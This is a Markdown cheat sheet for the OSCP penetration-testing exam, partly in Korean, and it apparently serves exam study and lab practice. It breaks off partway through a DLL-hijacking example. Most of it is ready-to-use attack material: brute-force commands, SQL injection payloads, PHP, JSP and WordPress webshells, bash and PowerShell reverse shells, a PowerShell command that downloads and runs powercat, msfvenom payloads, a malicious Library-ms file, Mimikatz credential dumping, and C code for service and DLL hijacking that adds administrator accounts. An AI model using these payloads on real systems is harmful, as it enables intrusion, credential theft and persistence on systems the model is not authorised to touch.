# OSCP CheatSheet

~~~
..............                                     
            ..,;:ccc,.                             
          ......''';lxO.                           
.....''''..........,:ld;                           
           .';;;:::;,,.x,                          
      ..'''.            0Xxoc:,.  ...              
  ....                ,ONkc;,;cokOdc',.            
 .                   OMo           ':ddo.          
                    dMc               :OO;         
                    0M.                 .:o.       
                    ;Wd                            
                     ;XO,                          
                       ,d0Odlc;,..                 
                           ..',;:cdOOd::,.         
                                    .:d;.':;.      
                                       'd,  .'     
                                         ;l   ..   
                                          .o       
                                            c      
                                            .'
                                             . 
~~~

* [Useful](#Useful)
* [Enumeration](#Enumeration)
* [FTP - 21](#ftp---21)
* [SSH - 22](#ssh---22)
* [SMTP - 25](#smtp---25)
* [HTTP, HTTPS - 80, 443](#http-https---80-443)
* [SNMP - 161](#snmp---161)
* [SMB - 445](#smb---445)
* [MSSQL - 1433](#MSSQL---1433)
* [NFS - 2049](#NFS---2049)
* [MySQL - 3306](#mysql---3306)
* [RDP - 3389](#rdp---3389)
* [PostgreSQL - 5432](#PostgreSQL---5432)
* [WINRM - 5985 - 5986](#WINRM---5985---5986)
* [Fuzzing](#Fuzzing)
* [Password crack](#password-crack)
  * [Hash identifier](#Hash-identifier)
  * [John the Ripper](#John-the-Ripper)
  * [Hashcat](#hashcat)
* [SQL Injection](#SQL-Injection)
  * [Examining the database](#examining-the-database)
  * [Union based SQL Injection](#Union-based-sql-injection)
  * [Blind SQL Injection](#Blind-SQL-Injection)
  * [Error based SQL Injection](#error-based-sql-injection)
  * [Time based SQL Injection](#Time-based-sql-injection)
  * [Filter bypass](#filter-bypass)
  * [SqlMap](#SqlMap)
* [Dumb Shell to Fully Interactive Shell](#dumb-shell-to-fully-interactive-shell)
* [Webshell](#Webshell)
* [ReverseShell](#ReverseShell)
* [Msfvenom](#Msfvenom)
* [Searchsploit](#Searchsploit)
* [Exiftool](#Exiftool)
* [Microsoft Windows Library Files](#Microsoft-Windows-Library-Files)
* [Mimikatz](#Mimikatz)
* [Windows Privilege Escalation](#Windows-Privilege-Escalation)
  * [Enumerating Windows](#Enumerating-Windows)
  * [Leveraging Windows Services](#Leveraging-Windows-Services)
  * [Abusing Other Windows Components](#Abusing-Other-Windows-Components)
* [Linux Privilege Escalation](#Linux-Privilege-Escalation)
  * [Enumerating Linux](#Enumerating-Linux)
  * [Exposed Confidential Information](#Exposed-Confidential-Information)
  * [Insecure File Permissions](#Insecure-File-Permissions)
  * [Insecure System Components](#Insecure-System-Components)
* [Port Redirection and SSH Tunneling](#Port-Redirection-and-SSH-Tunneling)
  * [Port Forwarding with Linux Tools](#Port-Forwarding-with-Linux-Tools)
  * [SSH Tunneling](#SSH-Tunneling)

# Useful

- OSCP Tools [https://github.com/RajChowdhury240/OSCP-CheatSheet/blob/main/Tools.md](https://github.com/RajChowdhury240/OSCP-CheatSheet/blob/main/Tools.md)
- The Cyber Swiss Army Knife [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
- GTFOBins (list of Unix binaries for post-exploitation) [https://gtfobins.github.io/](https://gtfobins.github.io/)
- Reverse Shell Generator [https://www.revshells.com/](https://www.revshells.com/)



# Enumeration

## Nmap

~~~ bash
nmap -sCV -Pn $target --open --min-rate 3000 -oA output
~~~

~~~ bash
cat txt.txt | grep -E -o "([0-9]{1,3}\.){3}[0-9]{1,3}" > ips.txt
nmap -iL ips.txt -v -p 139,445 --script smb-os-discovery -oG results.txt
~~~

~~~ bash
ll /usr/share/nmap/scripts | grep smb | awk '{ print $9 }'
~~~

## RustScan

~~~ bash
rustscan -a $target -- -sC -sV -oN rust_full.txt
~~~


# FTP - 21

## Login Brute force

~~~ bash
hydra -V -f -L users.txt -P passwords.txt ftp://target.com -u -vV
~~~


## Anonymous access

~~~ bash
ftp $ip
ftp> USER anonymous
ftp> PASS anonymous
~~~


# SSH - 22

## Login Brute force

~~~ bash
hydra -V -f -L users.txt -P passwords.txt ssh://target.com -u -vV
~~~

## SSH backdoor - post exploitation

~~~ bash
# Attacker
ssh-keygen -f <FILENAME>
chmod 600 <FILENAME>
cat <FILENAME>.pub -> copy

# Victim
echo <FILENAME>.pub >> <PATH>/.ssh/authorized_keys

# Connect
ssh -i <FILENAME> <USER>@<IP>
~~~


# SMTP - 25

## Send Email(with attachment)

~~~ bash
swaks --to target@example.com --from attacker@example.com --server example.com --auth LOGIN --auth-user attacker@example.com --auth-password password123 --header 'Subject: Test email' --body "This email contains an attachment." --attach @filename.bat
~~~


# HTTP, HTTPS - 80, 443

## Login Brute force(hydra)

~~~ bash
hydra -L users.txt -P passwords.txt target.com -s 8081 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid" -V
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://target.com
~~~

## WordPress Security Scanner(wpscan)

~~~ bash
wpscan --url https://<RHOST> --enumerate u,t,p
wpscan --url https://<RHOST> --plugins-detection aggressive
wpscan --url https://<RHOST> --disable-tls-checks
wpscan --url https://<RHOST> --disable-tls-checks --enumerate u,t,p
wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
~~~


## GitTools

~~~ bash
./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
~~~

## php://filter Wrapper

~~~ bash
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
~~~

## XSS

### XXStrike

~~~ bash
python3 xsstrike.py -u "http://target"
~~~


## Crawler

### photon

~~~ bash
python3 photon.py -u http://<RHOST> -l 3 -t 10 -v --wayback
~~~


```-u```, ```--url```: root url

```-t```, ```--threads```: number of threads(default: 2)

```-l```, ```--level``` : levels to crawl(default: 2)

```-v```, ```--verbose``` : verbose output

```--wayback``` : Use URLs from archive.org as seeds


### katana

| Field  | Describe                          | Example                                                                 |
|--------|-----------------------------------|-------------------------------------------------------------------------|
| url    | URL endpoint                      | https://admin.projectdiscovery.io/admin/login?user=admin&password=admin |
| qurl   | URL containing query parameters   | https://admin.projectdiscovery.io/admin/login.php?user=admin&password=admin |
| qpath  | Path containing query parameters  | /login?user=admin&password=admin                                        |
| path   | URL path                          | https://admin.projectdiscovery.io/admin/login                           |
| fqdn   | Fully qualified domain name       | admin.projectdiscovery.io                                               |
| rdn    | Root domain                       | projectdiscovery.io                                                     |
| rurl   | Root URL                          | https://admin.projectdiscovery.io                                       |
| file   | Filename in URL                   | login.php                                                               |
| key    | Parameter keys in URLs            | user,password                                                           |
| value  | Parameter values in the URL       | admin,admin                                                             |
| kv     | Keys = values in the URL          | user=admin&password=admin                                               |
| dir    | URL Directory Name                | /admin/                                                                 |
| udir   | URL with directory                | https://admin.projectdiscovery.io/admin/                                |

~~~ bash
katana -u https://tesla.com -f qurl -silent

https://shop.tesla.com/en_au?redirect=no
https://shop.tesla.com/en_nz?redirect=no
https://shop.tesla.com/product/men_s-raven-lightweight-zip-up-bomber-jacket?sku=1740250-00-A
https://shop.tesla.com/product/tesla-shop-gift-card?sku=1767247-00-A
https://shop.tesla.com/product/men_s-chill-crew-neck-sweatshirt?sku=1740176-00-A
https://www.tesla.com/about?redirect=no
https://www.tesla.com/about/legal?redirect=no
https://www.tesla.com/findus/list?redirect=no
~~~


# SNMP - 161

## snmpbulkwalk

## Scanning opened snmp

~~~ bash
sudo nmap -iL ips.txt -sU -p 161 --open -oG open-snmap.txt
~~~

~~~ bash
echo public > community
echo private >> community
echo manager >> community

for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
onesixtyone -c community -i ips
~~~


> Windows SNMP MIB Values


| OID               | 설명             |
|:------------------|:-----------------|
| 1.3.6.1.2.1.25.1.6.0 | 시스템 프로세스  |
| 1.3.6.1.2.1.25.4.2.1.2 | 프로그램 실행    |
| 1.3.6.1.2.1.25.4.2.1.4 | 프로세스 경로    |
| 1.3.6.1.2.1.25.2.3.1.4 | 보관 유닛        |
| 1.3.6.1.2.1.25.6.3.1.2 | 소프트웨어 이름  |
| 1.3.6.1.4.1.77.1.2.25 | 사용자 계정      |
| 1.3.6.1.2.1.6.13.1.3 | TCP 로컬 포트    |


~~~ bash
snmpbulkwalk -c public -v2c $target
~~~

~~~ bash
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25
~~~


# SMB - 445

## Get share files list

~~~ bash
smbclient -N -L \\\\<IP>
~~~

```-N``` --no-pass

```-L``` --list=HOST


## enum

~~~ bash
enum4linux -a <IP>
~~~


## Connection
~~~ bash
smbclient \\\\<IP>\\share
smbclient -N \\\\<IP>\\backups
~~~

~~~ bash
smbclient \\\\<IP>\\secrets -U Administrator --pw-nt-hash <NTLM_HASH>
~~~


## PsExec

### 전제 조건
- 타겟 호스트의 Local Administrator 권한을 갖고 있는 계정/비밀번호
- 타겟 호스트가 SMB 서비스를 사용하고 있으며 방화벽으로 막아놓지 않는 경우
- File and Print Sharing 활성화, Simple File Sharing 비활성화 (디폴트)

[https://www.xn--hy1b43d247a.com/lateral-movement/smb-psexec](https://www.xn--hy1b43d247a.com/lateral-movement/smb-psexec)

~~~ bash
impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
impacket-psexec Administrator:'Password123!'@<RHOST>
impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<RHOST>
impacket-ntlmrelayx --no-http-server -smb2support -t <RHOST> -c "powershell -enc JABjAGwAaQBlAG4AdA..."
~~~

# MSSQL - 1433

## MSSQL Connection

~~~ bash
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
~~~

~~~ sql
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM {databaseName}.information_schema.tables;
~~~

## Manual Code Execution

~~~ sql
SQL> EXECUTE sp_configure 'show advanced options', 1;
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
SQL> RECONFIGURE;
SQL> EXECUTE xp_cmdshell 'whoami';
~~~


# NFS - 2049

## Show Mountable NFS Shares

~~~ bash
showmount -e <IP>
nmap --script=nfs-showmount -oN mountable_shares <IP>
~~~

## Mount a share

~~~ bash
sudo mount -v -t nfs <IP>:<SHARE> /mnt/test
~~~

## NSE scan

~~~ bash
sudo nmap -p 111,2049 -Pn -n --open -sV --script="nfs-*" <IP>
~~~

# MySQL - 3306

## MySQL Connection

~~~ bash
mysql -uroot -p'root' -h192.168.248.16 -P 3306 --skip-ssl
~~~

~~~ sql
select version();
select user();
select system_user();
show databases;
~~~

## Manual Code Execution

*For this attack to work, the file location must be writable to the OS user running the database software.*
~~~ sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
~~~

## NSE scan

~~~ bash
sudo nmap -p 3306 -Pn -n --open -sV -sC --script="mysql-*" <IP>
~~~


## Login Brute force

~~~ bash
hydra -L <USERS_LIST> -P <PASSWORDS_LIST> <IP> mysql -vV -I -u
~~~

## Dumping

~~~ bash
mysqldump -u root -p 'password' -P 3389 -h hostname dbname tablename > mysqldump.sql
~~~


# RDP - 3389

## Connection

~~~ bash
xfreerdp /u:Administrator /p:'Password123!' /v:<IP> /dynamic-resolution
~~~


## Login Brute force

~~~ bash
hydra -f -L <USERS_LIST> -P <PASSWORDS_LIST> rdp://<IP> -u -vV
hydra -f -l admin -p 1q2w3e4r rdp://<IP> -u -vV
~~~

# PostgreSQL - 5432

## PostgreSQL Connection

~~~ bash
psql -h 192.168.50.63 -p 5432 -U postgres
~~~

## List the available databases

~~~ bash
postgres=# \l
~~~

## Connect to the database

~~~ bash
postgres=# \c databasename
~~~

## List tables in the current database

~~~ bash
postgres=# \dt;
~~~


## PostgreSQL Cracking (md5 password + username)

~~~ python
import hashlib

target_hash = "md5ae8c67affdb169a42c9631c02fc67ede"
username = "rubben"

with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
    for line in f:
        password = line.strip()
        combo = password + username
        hashed = "md5" + hashlib.md5(combo.encode()).hexdigest()
        if hashed == target_hash:
            print(f"[+] Password found: {password}")
            break
~~~

## Manual Code Execution

~~~ sql
COPY cmd_output FROM PROGRAM 'id';
~~~

# WINRM - 5985 - 5986

## Login Brute force

~~~ bash
crackmapexec winrm <IP> -u <USERS_LIST> -p <PASSWORDS_LIST>
~~~

## Connecting

~~~ bash
evil-winrm -i <IP> -u <USER> -p <PASSWORD>
evil-winrm -i <IP> -u <USER> -H <HASH>
~~~

## Interactive

~~~ bash
*Evil-WinRM* PS C:\Users\support\Desktop> upload <filename>
*Evil-WinRM* PS C:\Users\support\Desktop> download <filename>
~~~


# Fuzzing

## Path fuzzing

~~~ bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://target.com/FUZZ [-e .txt,.pdf,.bak,.old,.zip]
gobuster dir -u https://<RHOST> -w /usr/share/wordlists/dirb/common.txt -t 5 [-x php]
dirsearch -u https://<RHOST>
~~~

## Subdomain fuzzing

~~~ bash
ffuf -u http://target.com/ -w ./fuzzDicts/subdomainDicts/main.txt -H "Host:FUZZ.target.com" -mc 200
~~~




# Password crack

## Hash identifier

~~~ bash
hashid '$P$BINTaLa8QLMqeXbQtzT2Qfizm2P/nI0'
~~~


## John the Ripper

### Basically

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-MD5 --pot=john.output
~~~


### cracking htpasswd using mask

~~~ bash
john htpasswd -1=[0-9a-z] --mask='G4HeulB?1' --max-length=11
~~~

### cracking /etc/shadow

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
~~~

## Hashcat

### MD5(-m 0) cracking

~~~ bash
hashcat -m 0 -a 0 "412dd4759978acfcc81deab01b382403" /usr/share/wordlists/rockyou.txt.gz
hashcat -m 0 -a 0 hashfile.txt /usr/share/wordlists/rockyou.txt.gz
~~~

### Linux/Unix SHA512(-m 1800) cracking

~~~ bash
hashcat -m 1800 -a 0 hash.txt rockyou.txt
~~~


### Windows NTLM(-m 1000) cracking

~~~ bash
hashcat -m 1000 -a 0 hash.txt rockyou.txt
~~~

### SHA2-256(-m 1400) cracking

~~~ bash
hashcat -m 1400 -a 0 hash.txt rockyou.txt
~~~

### Get cracked passwords

~~~ bash
cat ~/.local/share/hashcat/hashcat.potfile
~~~


# SQL Injection

reference: [https://pentestmonkey.net/category/cheat-sheet/sql-injection](https://pentestmonkey.net/category/cheat-sheet/sql-injection)


## Examining the database

~~~ sql
-- MySQL
UNION SELECT TABLE_NAME,COLUMN_NAME, TABLE_SCHEMA FROM information_schema.columns WHERE TABLE_SCHEMA = database() -- //
UNION SELECT TABLE_NAME,TABLE_SCHEMA FROM information_schema.tables WHERE TABLE_SCHEMA = 0x64767761# 0x64767761 = 'dvwa'
UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 0x7573657273# 0x7573657273 = 'users'
UNION SELECT USER, PASSWORD FROM USERS#

--  Oracle
SELECT USER FROM DUAL;
SELECT table_name FROM user_tables;
SELECT * FROM T_USER WHERE ROWNUM <= 5;
~~~

reference: [https://portswigger.net/web-security/sql-injection/examining-the-database](https://portswigger.net/web-security/sql-injection/examining-the-database)


## Union based SQL Injection

~~~ sql
' ORDER BY 1-- //
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
%' UNION SELECT database(), user(), @@version, null, null -- //
~~~


## Blind SQL Injection

~~~ sql
-- boolean-based SQLi
' AND 1=1 -- //

if((select count(*) from information_schema.tables where table_schema='{DBNAME}') = 1, 1, 0) # check exist dbname
LENGTH((select table_name from information_schema.tables where table_schema='{DBNAME}'))={i} # examining dbname length
SUBSTRING((select table_name from information_schema.tables where table_schema='{DBNAME}'),{i},1)='{word}' # examining table name
~~~


## Error Based SQL Injection

~~~ sql
-- MySQL
' or 1=1 in (select @@version) -- //

-- MSSQL
if (@@VERSION)=9 select 1 else select 2;
' AND 1=CONVERT(int, (SELECT @@version)) -- -
' AND 1=CONVERT(int, DB_NAME()) -- -
' AND 1=CONVERT(int,(SELECT STRING_AGG(name, ',') FROM sysobjects WHERE xtype='U'))-- -
~~~



## Time Based SQL Injection

~~~ sql
-- MySQL
' AND IF (1=1, sleep(3),'false') -- //
' OR IF(1=1, SLEEP(5), 0)--+
' AND IF(ASCII(SUBSTRING(user(),1,1))=114, SLEEP(5), 0)--+

-- MSSQL
' IF (1=1) WAITFOR DELAY '0:0:5'--
' IF (ASCII(SUBSTRING(@@version,1,1))=77) WAITFOR DELAY '0:0:5'--

-- PostgreSQL
' OR pg_sleep(5)--
' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle
' OR 1=1 AND dbms_pipe.receive_message('a',5) IS NULL--
' AND CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',5) ELSE NULL END IS NULL--

-- SQLite
SELECT CASE WHEN (1=1) THEN randomblob(1000000000) ELSE 1 END--
~~~


## Filter bypass

Quote bypass: [https://www.rapidtables.com/convert/number/ascii-to-hex.html](https://www.rapidtables.com/convert/number/ascii-to-hex.html)

reference: [https://portswigger.net/support/sql-injection-bypassing-common-filters](https://portswigger.net/support/sql-injection-bypassing-common-filters)


## SqlMap
*Although sqlmap is a great tool to automate SQLi attacks, it provides next-to-zero stealth. Due to its high volume of traffic, sqlmap should not be used as a first-choice tool during assignments that require staying under the radar.*

~~~ bash
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user
sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump

# DB listing(technique: error based sqli)
sqlmap -u "https://victim/view.asp?bid=1&b_idx=45&s_type=&s_keyword=&page=1" --dbms=mssql --technique=E --dbs --batch

# Table listing(technique: error based sqli)
sqlmap -u "https://victim/view.asp?bid=1&b_idx=45&s_type=&s_keyword=&page=1" --dbms=mssql --technique=E -D WEBDB --tables --batch

# Table dump
sqlmap -u "https://victim/view.asp?bid=1&b_idx=45&s_type=&s_keyword=&page=1" --dbms=mssql --technique=E -D WEBDB -T users --threads=10 --dump --batch

# POST request
sqlmap -u "http://192.168.225.48/" --data="mail-list=asdf@asdf.com" --method=POST --dbs --batch

# Intercepting the POST request with Burp, Running sqlmap with os-shell
sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
~~~



# Dumb Shell to Fully Interactive Shell

~~~ bash
python3 -c 'import pty; pty.spawn("/bin/sh")'
~~~

~~~ bash
script /dev/null -c bash
# Ctrl + z
stty -raw echo; fg
# Enter (Return) x2
reset
xterm-256color
~~~

# Webshell

## PHP Webshell
~~~ shell
/usr/share/webshells/php/simple-backdoor.php
~~~

## ASP, ASPX Webshell
~~~ shell
/usr/share/webshells/asp/cmdasp.asp
/usr/share/webshells/aspx/cmdasp.aspx
~~~

## JSP Webshell
~~~ jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
~~~

## One line(User-Agent, log poisoning)

~~~ php
<?php echo system($_GET['cmd']); ?>
~~~

## Webshell upload via Wordpress plugin

~~~ php
// wordpress-webshell.php
<?php
/*
Plugin Name: WebShell
*/
if(isset($_GET['cmd'])){
  echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
~~~

~~~ shell
zip wordpress-webshell.zip wordpress-webshell.php
# upload plugin(http://target/wp-admin/plugin-install.php)
# http://target/wp-content/plugins/wordpress-webshell/wordpress-webshell.php?cmd=cat%20/tmp/flag
~~~


# ReverseShell

## Bash -i
~~~ bash
/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.210/4444 0>&1'
~~~

## PHP ReverseShell
~~~ shell
/usr/share/webshells/php/php-reverse-shell.php
~~~

## PowerShell

~~~ bash
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');powercat -c 192.168.119.3 -p 4444 -e powershell"
~~~

~~~ powershell
kali@kali:~$ pwsh
PowerShell 7.1.3
Copyright (c) Microsoft Corporation.

https://aka.ms/powershell
Type 'help' to get help.

PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'


PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

PS> $EncodedText =[Convert]::ToBase64String($Bytes)

PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA


PS> exit
~~~

~~~ shell
kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
...
AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
~~~


## Attacker Listener
~~~ shell
nc -nvlp 4444
~~~

## Victim Connection
~~~ shell
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
~~~


# Msfvenom

## ReverseShell(Windows)
~~~ bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker.ip LPORT=4444 -f exe > reverseshell.exe
~~~

## BindShell(Linux)
~~~ bash
msfvenom -p linux/x64/shell_bind_tcp RHOST=victim.ip LPORT=4444 -f elf -o bindshell.elf
~~~

## ReverseShell(Linux)
~~~ bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker.ip LPORT=4444 -f elf -o reverseshell.elf
~~~


# Searchsploit

~~~ bash
searchsploit [keyword]

# Show the full path to an exploit
searchsploit -p [EDB-ID]

# Mirror (aka copies) an exploit to the current working directory
searchsploit -m [EDB-ID]
~~~


# Exiftool

## payload injection into exif

~~~ bash
exiftool exif.jpg -artist="<svg/onload=alert(45)>"
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' image.png
~~~

reference: https://www.hahwul.com/blog/2017/web-hacking-metadata-payload/


# Microsoft Windows Library Files

*칼리 - 윈도우 파일 송수신 기능*

## Installation of wsgidav

~~~ bash
pip install wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /PATH/TO/DIRECTORY/webdav/
~~~

## config.Library-ms

~~~ xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription
	xmlns="http://schemas.microsoft.com/windows/2009/library">
	<name>@windows.storage.dll,-34582</name>
	<version>6</version>
	<isLibraryPinned>true</isLibraryPinned>
	<iconReference>imageres.dll,-1003</iconReference>
	<templateInfo>
		<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
	</templateInfo>
	<searchConnectorDescriptionList>
		<searchConnectorDescription>
			<isDefaultSaveLocation>true</isDefaultSaveLocation>
			<isSupported>false</isSupported>
			<simpleLocation>
				<url>http://attacker.ip</url>
			</simpleLocation>
		</searchConnectorDescription>
	</searchConnectorDescriptionList>
</libraryDescription>
~~~


# Mimikatz

~~~ powershell
PS C:\tools> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # 
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

656     {0;000003e7} 1 D 34811          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000413a0} 1 F 6146616     MARKETINGWK01\offsec    S-1-5-21-4264639230-2296035194-3358247000-1001  (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 6217216     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
 
mimikatz # lsadump::sam
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264639230-2296035194-3358247000
 
RID  : 000003e9 (1001)
User : offsec
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
 
RID  : 000003ea (1002)
User : nelly
  Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10
~~~

~~~ bash
hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt.gz -r /usr/share/hashcat/rules/best64.rule
~~~


~~~ bash
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords
~~~


~~~ bash
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # misc::memssp
Injected =)

PS C:\Users\offsec> type C:\Windows\System32\mimilsa.log
~~~

# Windows Privilege Escalation

## Enumerating Windows

### Base64 encoding/decoding

~~~ powershell
$ pwsh
PS> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("TEST"))
VABFAFMAVAA=

PS> [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("VABFAFMAVAA="))
TEST
~~~

### Get Local Users/Groups

~~~ powershell
PS> Get-LocalUser
PS> Get-LocalGroup
PS> Get-LocalGroupMember Administrators
~~~

### Listing installed applications

~~~ powershell
PS> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
~~~

### Get Process's path

~~~ powershell
PS> Get-Process NonStandardProcess | Select-Object Path
~~~

### Files searching

~~~ powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
~~~


### Select String(grep)

~~~ powershell
type result.txt | select-string master
~~~


### Get PowerShell History

~~~ powershell
type (Get-PSReadLineOption).HistorySavePath
~~~

### Invoke Web Request(File download)

~~~ powershell
iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe
~~~



### Run as other user

~~~ cmd
runas /user:backupadmin cmd
~~~


## Leveraging Windows Services

### Service Binary Hijacking
---

#### Get Running services
~~~ powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
~~~

#### icacls permissions mask
| Mask | Permissions           |
|------|------------------------|
| F    | Full access            |
| M    | Modify access          |
| RX   | Read and execute access|
| R    | Read-only access       |
| W    | Write-only access      |

#### Check service binary permissions

~~~ powershell
icacls "C:\xampp\apache\bin\httpd.exe"
~~~


#### adduser.c code

~~~ c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
~~~

#### Cross-Compile the C Code to a 64-bit application

~~~ bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
~~~


#### Replacing mysqld.exe with our malicious binary

~~~ powershell
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
~~~

#### Attempting to stop the service to restart it

~~~ powershell
net stop mysql
~~~

#### Obtain Startup Type for mysql service

~~~ powershell
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
~~~

#### Checking for reboot privileges

~~~ powershell
whoami /priv
~~~

#### Rebooting the machine

~~~ powershell
shutdown /r /t 0
~~~


### DLL Hijacking
---

#### C++ DLL example code from Microsoft

~~~ c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
